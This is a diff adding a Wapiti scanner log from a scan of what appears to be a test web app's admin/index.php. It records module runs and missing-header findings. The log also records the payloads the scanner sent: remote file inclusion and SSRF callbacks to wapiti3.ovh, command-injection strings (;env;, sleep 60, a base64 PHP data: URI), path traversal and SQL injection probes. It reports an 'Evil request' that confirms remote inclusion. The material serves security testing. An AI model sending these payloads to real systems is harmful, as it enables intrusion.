@@ -1,0 +1,89 @@
+2024-03-20 14:32:07.659 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/admin/index.php?page=fuzz (0)
+2024-03-20 14:32:07.785 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 14:32:07.785 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_92d42bc5.db
+2024-03-20 14:32:07.789 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
+2024-03-20 14:32:07.819 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 14:32:07.819 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 14:32:07.902 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 14:32:07.927 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 14:32:07.927 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 14:32:07.943 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/admin/index.php?page=fuzz (0)
+2024-03-20 14:32:07.952 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-20 14:32:07.952 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-20 14:32:08.016 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-20 14:32:08.016 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-20 14:32:08.086 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-20 14:32:08.097 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/admin/index.php?page=fuzz (0)
+2024-03-20 14:32:08.099 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/admin/index.php?page=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
+2024-03-20 14:32:08.337 | RED      | wapitiCore.attack.mod_file:attack:250 - ---
+2024-03-20 14:32:08.338 | RED      | wapitiCore.attack.mod_file:attack:251 - Remote inclusion vulnerability in http://web/admin/index.php via injection in the parameter page
+2024-03-20 14:32:08.338 | RED      | wapitiCore.attack.mod_file:attack:261 - Evil request:
+2024-03-20 14:32:08.338 | RED      | wapitiCore.attack.mod_file:attack:262 -     GET /admin/index.php?page=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+2024-03-20 14:32:08.338 | RED      | wapitiCore.attack.mod_file:attack:263 - ---
+2024-03-20 14:32:08.356 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-20 14:32:08.370 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/admin/index.php?page=fuzz (0)
+2024-03-20 14:32:08.370 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/admin/index.php?page=https%3A%2F%2Fopenbugbounty.org%2F
+2024-03-20 14:32:10.075 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/admin/index.php?page=%2F%2Fopenbugbounty.org%2F
+2024-03-20 14:32:10.108 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 14:32:10.139 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 14:32:10.153 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/admin/index.php?page=fuzz (0)
+2024-03-20 14:32:10.154 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/admin/index.php?page=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fxfeg04%2F1%2F70616765%2F (0)
+2024-03-20 14:32:10.300 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=xfeg04 for results, please wait...
+2024-03-20 14:32:12.380 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 14:32:12.398 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/admin/index.php?page=fuzz (0)
+2024-03-20 14:32:12.401 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=%3Benv%3B (0)
+2024-03-20 14:32:12.407 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=%7Cenv%7C (0)
+2024-03-20 14:32:12.412 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=a%3Benv%3B (0)
+2024-03-20 14:32:12.417 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=a%3Benv%3B (0)
+2024-03-20 14:32:12.421 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
+2024-03-20 14:32:12.426 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=fuzz%3Benv%3B (0)
+2024-03-20 14:32:12.431 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=fuzz%0Aenv%3B (0)
+2024-03-20 14:32:12.438 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=%26set%26 (0)
+2024-03-20 14:32:12.443 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=set (0)
+2024-03-20 14:32:12.449 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=env (0)
+2024-03-20 14:32:12.456 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=%2Fe%00 (0)
+2024-03-20 14:32:12.464 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 14:32:12.471 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 14:32:12.481 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 14:32:12.487 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 14:32:12.492 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 14:32:12.499 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 14:32:12.506 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 14:32:12.511 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 14:32:12.517 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 14:32:12.523 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 14:32:12.528 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 14:32:12.537 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 14:32:12.545 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
+2024-03-20 14:32:12.551 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=a%60%29%60 (0)
+2024-03-20 14:32:12.558 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=a%60sleep%2060%60 (0)
+2024-03-20 14:32:12.565 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=a%3Bsleep%2060%3B (0)
+2024-03-20 14:32:12.571 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=a%7Csleep%2060%3B (0)
+2024-03-20 14:32:12.580 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/admin/index.php?page=%26ping%20-n%2025%20127.0.0.1%26 (0)
+2024-03-20 14:32:12.613 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 14:32:12.632 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/admin/index.php?page=fuzz (0)
+2024-03-20 14:32:12.638 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-20 14:32:12.711 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 14:32:12.727 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/admin/index.php?page=fuzz (0)
+2024-03-20 14:32:12.727 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/admin/index.php?page=fuzz%C2%BF%27%22%28 (0)
+2024-03-20 14:32:12.737 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/admin/index.php?page=fuzz%20AND%2037%3D125%20AND%2089%3D89 (0)
+2024-03-20 14:32:12.742 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/admin/index.php?page=fuzz%27%20AND%2079%3D115%20AND%20%2738%27%3D%2738 (0)
+2024-03-20 14:32:12.749 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/admin/index.php?page=fuzz%22%20AND%2076%3D149%20AND%20%2234%22%3D%2234 (0)
+2024-03-20 14:32:12.755 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/admin/index.php?page=fuzz%29%20AND%2018%3D44%20AND%20%2820%3D20 (0)
+2024-03-20 14:32:12.763 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/admin/index.php?page=fuzz%27%29%20AND%2095%3D164%20AND%20%28%2789%27%3D%2789 (0)
+2024-03-20 14:32:12.769 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/admin/index.php?page=fuzz%22%29%20AND%2046%3D104%20AND%20%28%2250%22%3D%2250 (0)
+2024-03-20 14:32:12.788 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 14:32:12.798 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/admin/index.php?page=fuzz (0)
+2024-03-20 14:32:12.820 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 14:32:12.831 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/admin/index.php?page=fuzz (0)
+2024-03-20 14:32:12.846 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-20 14:32:12.860 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/admin/index.php?page=fuzz (0)
+2024-03-20 14:32:12.929 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-20 14:32:12.952 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//admin.json/
+2024-03-20 14:32:12.952 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//admin.json/web_03202024_1432.html with a browser to see this report.
